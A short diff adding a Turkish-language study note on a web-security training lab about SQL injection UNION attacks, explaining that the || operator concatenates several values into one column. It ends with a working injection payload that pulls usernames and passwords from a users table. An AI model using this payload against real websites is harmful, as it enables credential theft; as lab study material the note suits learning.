@@ -1,1 +1,9 @@
- Lab: SQL injection UNION attack, retrieving multiple values in a single column
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+Kategori: SQL Injection
+Seviye: Apprentice
+
+Açıklama:
+Sadece bir satırda bilgi birleşik bir şekilde arasına istediğin karakteri koyarak alabilirsin.
+|| bu o işi yapar.
+
+request:'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
